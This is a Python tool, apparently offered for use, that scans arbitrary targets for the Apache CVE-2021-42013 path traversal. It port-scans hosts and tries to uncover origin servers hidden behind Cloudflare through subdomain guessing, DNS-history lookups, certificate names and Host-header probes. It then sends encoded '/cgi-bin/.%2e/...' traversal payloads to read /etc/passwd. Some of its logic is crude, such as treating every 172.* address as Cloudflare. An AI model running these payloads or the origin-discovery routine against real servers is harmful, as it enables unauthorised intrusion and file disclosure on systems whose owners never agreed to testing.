#!/usr/bin/env python3
"""
BOOS Advanced Apache CVE-2021-42013 Vulnerability Scanner
Professional Edition - Cloudflare Bypass & Real Server Detection
"""

import socket
import requests
import urllib3
import sys
import time
import re
import json
import os
import subprocess
import ssl
import dns.resolver
import threading
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style, Back
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

class BOOSFramework:
    """Main BOOS Framework Class"""
    
    def __init__(self):
        self.vulnerable_servers = []
        self.session = requests.Session()
        self.version = "5.0.0"
        self.author = "BOOS"
        self.current_domain = None
        self.setup_session()
        
    def setup_session(self):
        """Setup requests session"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.session.timeout = 5
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_header(self):
        """Print clean header"""
        self.clear_screen()
        
        print(Fore.RED + "╔════════════════════════════════════════════════════════════════╗")
        print(Fore.RED + "║" + Fore.YELLOW + "██████╗  ██████╗  ██████╗ ███████╗".center(58) + Fore.RED + "║")
        print(Fore.RED + "║" + Fore.YELLOW + "██╔══██╗██╔═══██╗██╔═══██╗██╔════╝".center(58) + Fore.RED + "║") 
        print(Fore.RED + "║" + Fore.YELLOW + "██████╔╝██║   ██║██║   ██║███████╗".center(58) + Fore.RED + "║")
        print(Fore.RED + "║" + Fore.YELLOW + "██╔══██╗██║   ██║██║   ██║╚════██║".center(58) + Fore.RED + "║")
        print(Fore.RED + "║" + Fore.YELLOW + "██████╔╝╚██████╔╝╚██████╔╝███████║".center(58) + Fore.RED + "║")
        print(Fore.RED + "║" + Fore.YELLOW + "╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝".center(58) + Fore.RED + "║")
        print(Fore.RED + "╚════════════════════════════════════════════════════════════════╝")
        
        print()
        print(Fore.CYAN + "┌────────────────────────────────────────────────────────────────┐")
        print(Fore.CYAN + "│" + Fore.GREEN + "  Apache CVE-2021-42013 Advanced Exploitation Framework".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.YELLOW + f"  Version {self.version} | Developed by: {self.author}".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.RED + "  🔒 Professional Vulnerability Scanner".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "│" + Fore.MAGENTA + "  🛡️ Advanced Cloudflare Bypass Engine".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "└────────────────────────────────────────────────────────────────┘")
        print()
    
    def print_input_section(self):
        """Print input section"""
        print(Fore.GREEN + "┌────────────────────────────────────────────────────────────────┐")
        print(Fore.GREEN + "│" + Fore.WHITE + "  📝 ENTER TARGET INFORMATION".center(58) + Fore.GREEN + "│")
        print(Fore.GREEN + "├────────────────────────────────────────────────────────────────┤")
        print(Fore.GREEN + "│" + Fore.YELLOW + "    • https://example.com  (Full URL)".ljust(58) + Fore.GREEN + "│")
        print(Fore.GREEN + "│" + Fore.YELLOW + "    • example.com          (Domain name)".ljust(58) + Fore.GREEN + "│")
        print(Fore.GREEN + "│" + Fore.YELLOW + "    • 192.168.1.100        (IP address)".ljust(58) + Fore.GREEN + "│")
        print(Fore.GREEN + "│" + Fore.YELLOW + "    • quit                 (Exit)".ljust(58) + Fore.GREEN + "│")
        print(Fore.GREEN + "└────────────────────────────────────────────────────────────────┘")
        print()
    
    def check_port(self, target, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def detect_cloudflare(self, response):
        """Detect if Cloudflare is being used"""
        cf_headers = ['cf-ray', 'cf-cache-status', '__cfduid']
        server = response.headers.get('Server', '').lower()
        
        if 'cloudflare' in server:
            return True
        for header in response.headers:
            if any(cf in header.lower() for cf in cf_headers):
                return True
        return False
    
    def find_real_server_advanced(self, domain):
        """Advanced real server detection"""
        found_servers = []
        
        print(Fore.CYAN + "│" + Fore.YELLOW + "  🔍 Advanced real server detection...".ljust(58) + Fore.CYAN + "│")
        
        # METHOD 1: Common subdomains that might point to real server
        subdomains = [
            'direct', 'origin', 'backend', 'server', 'web', 'mail', 'ftp',
            'ssh', 'admin', 'cpanel', 'direct-connect', 'origin-www',
            'backend-www', 'server-www', 'cp', 'plesk', 'webmail',
            'host', 'hosting', 'server1', 'server2', 'ns1', 'ns2',
            'mx1', 'mx2', 'vps', 'dedicated', 'cloud', 'secure',
            'ssl', 'portal', 'login', 'auth', 'api', 'dev', 'staging',
            'test', 'demo', 'beta', 'alpha', 'app', 'application'
        ]
        
        for sub in subdomains:
            try:
                subdomain = f"{sub}.{domain}"
                ip = socket.gethostbyname(subdomain)
                
                # Check if IP is not Cloudflare
                if not ip.startswith(('104.', '172.', '173.')):
                    found_servers.append({
                        'type': 'subdomain',
                        'name': subdomain,
                        'ip': ip
                    })
                    print(Fore.CYAN + "│" + Fore.GREEN + f"     ✓ Found: {subdomain} -> {ip}".ljust(58) + Fore.CYAN + "│")
            except:
                continue
        
        # METHOD 2: DNS history (using public services)
        try:
            # SecurityTrails (simplified)
            response = self.session.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=3)
            if response.status_code == 200:
                lines = response.text.strip().split('\n')
                for line in lines:
                    if ',' in line:
                        sub, ip = line.split(',')
                        if not ip.startswith(('104.', '172.', '173.')):
                            found_servers.append({
                                'type': 'history',
                                'name': sub,
                                'ip': ip
                            })
                            print(Fore.CYAN + "│" + Fore.GREEN + f"     ✓ Historical: {sub} -> {ip}".ljust(58) + Fore.CYAN + "│")
        except:
            pass
        
        # METHOD 3: SSL Certificate analysis
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.connect((domain, 443))
                cert = s.getpeercert()
                
                if 'subjectAltName' in cert:
                    for san in cert['subjectAltName']:
                        if san[0] == 'DNS' and san[1] != domain:
                            try:
                                ip = socket.gethostbyname(san[1])
                                if not ip.startswith(('104.', '172.', '173.')):
                                    found_servers.append({
                                        'type': 'ssl',
                                        'name': san[1],
                                        'ip': ip
                                    })
                                    print(Fore.CYAN + "│" + Fore.GREEN + f"     ✓ SSL Cert: {san[1]} -> {ip}".ljust(58) + Fore.CYAN + "│")
                            except:
                                pass
        except:
            pass
        
        # METHOD 4: Check Cloudflare IPs for open ports
        cloudflare_ips = ['104.21.11.94', '172.67.148.153']
        for cf_ip in cloudflare_ips:
            for port in [80, 443, 8080, 8443, 8880]:
                if self.check_port(cf_ip, port):
                    # Try to get server info
                    try:
                        protocol = 'https' if port in [443, 8443] else 'http'
                        url = f"{protocol}://{cf_ip}:{port}"
                        headers = {'Host': domain}
                        response = self.session.get(url, timeout=2, verify=False, headers=headers)
                        server = response.headers.get('Server', '')
                        
                        if server and 'cloudflare' not in server.lower():
                            found_servers.append({
                                'type': 'direct',
                                'name': f"Cloudflare IP {cf_ip}:{port}",
                                'ip': cf_ip,
                                'port': port,
                                'server': server
                            })
                            print(Fore.CYAN + "│" + Fore.GREEN + f"     ✓ Direct: {cf_ip}:{port} -> {server}".ljust(58) + Fore.CYAN + "│")
                    except:
                        pass
        
        return found_servers
    
    def get_server_info_direct(self, ip, port, hostname):
        """Get server info directly from IP"""
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            url = f"{protocol}://{ip}:{port}"
            headers = {'Host': hostname}
            
            response = self.session.get(url, timeout=3, verify=False, headers=headers)
            server = response.headers.get('Server', 'Unknown')
            
            # Try different user agents
            if server == 'Unknown' or 'cloudflare' in server.lower():
                ua = 'Googlebot/2.1 (+http://www.google.com/bot.html)'
                headers = {'Host': hostname, 'User-Agent': ua}
                response = self.session.get(url, timeout=2, verify=False, headers=headers)
                server = response.headers.get('Server', 'Unknown')
            
            return {
                'software': server,
                'version': self.extract_version(server),
                'os': self.extract_os(server),
                'vulnerable': self.check_version_vulnerable(server)
            }
        except:
            return None
    
    def extract_version(self, server_string):
        """Extract Apache version from server string"""
        match = re.search(r'Apache/(\d+\.\d+\.\d+)', server_string)
        return match.group(1) if match else 'Unknown'
    
    def extract_os(self, server_string):
        """Extract OS from server string"""
        match = re.search(r'\((.*?)\)', server_string)
        return match.group(1) if match else 'Unknown'
    
    def check_version_vulnerable(self, server_string):
        """Check if version is vulnerable"""
        version = self.extract_version(server_string)
        return version in ['2.4.49', '2.4.50']
    
    def get_server_info(self, url, hostname=None):
        """Get detailed server information"""
        info = {
            'software': 'Unknown',
            'version': 'Unknown',
            'os': 'Unknown',
            'vulnerable': False,
            'cloudflare': False,
            'real_servers': [],
            'bypass_success': False
        }
        
        try:
            # Make initial request
            response = self.session.get(url, timeout=5, verify=False)
            server = response.headers.get('Server', 'Unknown')
            info['software'] = server
            info['version'] = self.extract_version(server)
            info['os'] = self.extract_os(server)
            info['vulnerable'] = self.check_version_vulnerable(server)
            
            # Check for Cloudflare
            if self.detect_cloudflare(response):
                info['cloudflare'] = True
                info['software'] = 'cloudflare'
                info['version'] = 'Unknown'
                info['os'] = 'Unknown'
                
                print(Fore.CYAN + "│" + Fore.YELLOW + "  ⚡ Cloudflare detected - searching for real server...".ljust(58) + Fore.CYAN + "│")
                
                # Find real servers
                real_servers = self.find_real_server_advanced(hostname)
                
                if real_servers:
                    info['real_servers'] = real_servers
                    info['bypass_success'] = True
                    
                    # Try to get server info from each real server
                    for server_info in real_servers:
                        if 'ip' in server_info:
                            for port in [80, 443, 8080, 8443, 8880]:
                                direct_info = self.get_server_info_direct(server_info['ip'], port, hostname)
                                if direct_info and direct_info['software'] != 'Unknown':
                                    server_info['server_info'] = direct_info
                                    print(Fore.CYAN + "│" + Fore.GREEN + f"     → Real server: {direct_info['software']} on {server_info['ip']}:{port}".ljust(58) + Fore.CYAN + "│")
                                    break
                else:
                    print(Fore.CYAN + "│" + Fore.RED + "     ✗ No real servers found".ljust(58) + Fore.CYAN + "│")
        
        except Exception as e:
            pass
        
        return info
    
    def print_server_info(self, info):
        """Print server information"""
        print(Fore.CYAN + "│" + Fore.WHITE + "  📋 SERVER INFORMATION:".ljust(58) + Fore.CYAN + "│")
        
        if info['cloudflare']:
            print(Fore.CYAN + "│" + Fore.YELLOW + f"     • Proxy: Cloudflare Detected".ljust(58) + Fore.CYAN + "│")
        
        if info['real_servers']:
            print(Fore.CYAN + "│" + Fore.GREEN + f"     • Real Servers Found: {len(info['real_servers'])}".ljust(58) + Fore.CYAN + "│")
            
            for idx, server in enumerate(info['real_servers'][:3], 1):
                if 'server_info' in server:
                    sinfo = server['server_info']
                    print(Fore.CYAN + "│" + Fore.CYAN + f"     • Server {idx}:".ljust(58) + Fore.CYAN + "│")
                    print(Fore.CYAN + "│" + Fore.CYAN + f"       Software: {sinfo['software']}".ljust(58) + Fore.CYAN + "│")
                    print(Fore.CYAN + "│" + Fore.CYAN + f"       Version: {sinfo['version']}".ljust(58) + Fore.CYAN + "│")
                    print(Fore.CYAN + "│" + Fore.CYAN + f"       OS: {sinfo['os']}".ljust(58) + Fore.CYAN + "│")
                    print(Fore.CYAN + "│" + Fore.CYAN + f"       IP: {server['ip']}".ljust(58) + Fore.CYAN + "│")
                    
                    if sinfo['vulnerable']:
                        print(Fore.CYAN + "│" + Fore.RED + f"       ⚠ VULNERABLE!".ljust(58) + Fore.CYAN + "│")
        else:
            print(Fore.CYAN + "│" + Fore.YELLOW + f"     • Software: {info['software']}".ljust(58) + Fore.CYAN + "│")
            print(Fore.CYAN + "│" + Fore.YELLOW + f"     • Version: {info['version']}".ljust(58) + Fore.CYAN + "│")
            print(Fore.CYAN + "│" + Fore.YELLOW + f"     • OS: {info['os']}".ljust(58) + Fore.CYAN + "│")
            
            if info['vulnerable']:
                print(Fore.CYAN + "│" + Fore.RED + f"     • Risk: 🚨 CRITICAL - Vulnerable!".ljust(58) + Fore.CYAN + "│")
            elif info['software'] != 'Unknown':
                print(Fore.CYAN + "│" + Fore.GREEN + f"     • Risk: ✅ Secure".ljust(58) + Fore.CYAN + "│")
            else:
                print(Fore.CYAN + "│" + Fore.YELLOW + f"     • Risk: ❓ Unknown".ljust(58) + Fore.CYAN + "│")
    
    def check_vulnerability(self, url, hostname=None):
        """Check if URL is vulnerable"""
        result = {
            'url': url,
            'vulnerable': False,
            'server_info': None,
            'confidence': 0
        }
        
        server_info = self.get_server_info(url, hostname)
        result['server_info'] = server_info
        
        # Check real servers for vulnerability
        if server_info.get('real_servers'):
            for server in server_info['real_servers']:
                if 'server_info' in server and server['server_info']['vulnerable']:
                    result['vulnerable'] = True
                    result['confidence'] = 95
        
        # Test payloads
        payloads = [
            '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/cgi-bin/.%252e/.%252e/.%252e/.%252e/etc/passwd',
        ]
        
        for payload in payloads:
            try:
                test_url = url + payload
                response = self.session.get(test_url, timeout=3, verify=False)
                
                if response.status_code == 200:
                    if 'root:x:0:0:' in response.text:
                        result['vulnerable'] = True
                        result['confidence'] = 100
                        break
            except:
                continue
        
        return result
    
    def scan_target(self, target):
        """Scan target for vulnerabilities"""
        print()
        print(Fore.CYAN + "┌────────────────────────────────────────────────────────────────┐")
        print(Fore.CYAN + "│" + Fore.RED + f"  🎯 SCANNING TARGET: {target}".center(58) + Fore.CYAN + "│")
        print(Fore.CYAN + "├────────────────────────────────────────────────────────────────┤")
        
        # Extract hostname
        if target.startswith(('http://', 'https://')):
            host = target.split('://')[1].split('/')[0]
        else:
            host = target.split('/')[0]
        
        # Port scanning
        ports = [80, 443, 8080, 8443, 8880, 9443]
        open_ports = []
        
        print(Fore.CYAN + "│" + Fore.YELLOW + "  📡 Scanning ports...".ljust(58) + Fore.CYAN + "│")
        
        for port in ports:
            is_open = self.check_port(host, port)
            status = "✓ OPEN" if is_open else "✗ CLOSED"
            color = Fore.GREEN if is_open else Fore.RED
            print(Fore.CYAN + "│" + color + f"    Port {port}: {status}".ljust(58) + Fore.CYAN + "│")
            if is_open:
                open_ports.append(port)
        
        if not open_ports:
            print(Fore.CYAN + "│" + Fore.RED + "  ⚠ No open ports found!".ljust(58) + Fore.CYAN + "│")
            print(Fore.CYAN + "└────────────────────────────────────────────────────────────────┘")
            return
        
        print(Fore.CYAN + "├────────────────────────────────────────────────────────────────┤")
        
        # Test each open port
        vulnerable_found = False
        
        for port in open_ports:
            protocol = 'https' if port in [443, 8443, 9443] else 'http'
            url = f"{protocol}://{host}:{port}"
            
            print(Fore.CYAN + "│" + Fore.WHITE + f"  🔍 Testing {url}".ljust(58) + Fore.CYAN + "│")
            
            result = self.check_vulnerability(url, host)
            
            if result['server_info']:
                self.print_server_info(result['server_info'])
            
            if result['vulnerable']:
                vulnerable_found = True
                self.vulnerable_servers.append(result)
                print(Fore.CYAN + "│" + Fore.RED + "  🚨 VULNERABLE!".ljust(58) + Fore.CYAN + "│")
            else:
                print(Fore.CYAN + "│" + Fore.GREEN + "  ✅ Secure".ljust(58) + Fore.CYAN + "│")
            
            print(Fore.CYAN + "├────────────────────────────────────────────────────────────────┤")
        
        # Show summary
        if vulnerable_found:
            self.print_vulnerable_summary()
        else:
            print()
            print(Fore.GREEN + "┌────────────────────────────────────────────────────────────────┐")
            print(Fore.GREEN + "│" + Fore.WHITE + "  📊 SCAN COMPLETE - NO VULNERABILITIES FOUND".center(58) + Fore.GREEN + "│")
            print(Fore.GREEN + "└────────────────────────────────────────────────────────────────┘")
    
    def print_vulnerable_summary(self):
        """Print summary of vulnerable servers"""
        print()
        print(Fore.RED + "┌────────────────────────────────────────────────────────────────┐")
        print(Fore.RED + "│" + Fore.YELLOW + "  ⚠ CRITICAL VULNERABILITIES DETECTED!".center(58) + Fore.RED + "│")
        print(Fore.RED + "├────────────────────────────────────────────────────────────────┤")
        
        for idx, server in enumerate(self.vulnerable_servers, 1):
            print(Fore.RED + "│" + Fore.WHITE + f"  Target {idx}: {server['url']}".ljust(58) + Fore.RED + "│")
            if server['server_info'].get('real_servers'):
                for rs in server['server_info']['real_servers']:
                    if 'server_info' in rs:
                        print(Fore.RED + "│" + Fore.CYAN + f"  • Real Server: {rs['server_info']['software']}".ljust(58) + Fore.RED + "│")
                        print(Fore.RED + "│" + Fore.CYAN + f"    Version: {rs['server_info']['version']}".ljust(58) + Fore.RED + "│")
            print(Fore.RED + "│" + Fore.CYAN + f"  • Confidence: {server['confidence']}%".ljust(58) + Fore.RED + "│")
            if idx < len(self.vulnerable_servers):
                print(Fore.RED + "├────────────────────────────────────────────────────────────────┤")
        
        print(Fore.RED + "└────────────────────────────────────────────────────────────────┘")
    
    def run(self):
        """Main execution loop"""
        while True:
            self.print_header()
            self.print_input_section()
            
            target = input(Fore.RED + "BOOS" + Fore.YELLOW + "@" + Fore.CYAN + "Framework" + Fore.WHITE + " > " + Style.RESET_ALL).strip()
            
            if target.lower() in ['quit', 'exit', 'q']:
                print(Fore.YELLOW + "\n👋 Exiting BOOS Framework. Stay secure!")
                break
            
            if target:
                self.vulnerable_servers = []
                self.scan_target(target)
                
                print(Fore.CYAN + "\nPress Enter to continue...")
                input()

def main():
    """Main function"""
    try:
        # Check for dnspython
        try:
            import dns.resolver
        except ImportError:
            print(Fore.YELLOW + "[!] Installing dnspython...")
            os.system("pip3 install dnspython --quiet")
        
        framework = BOOSFramework()
        framework.run()
        
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n⚡ Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()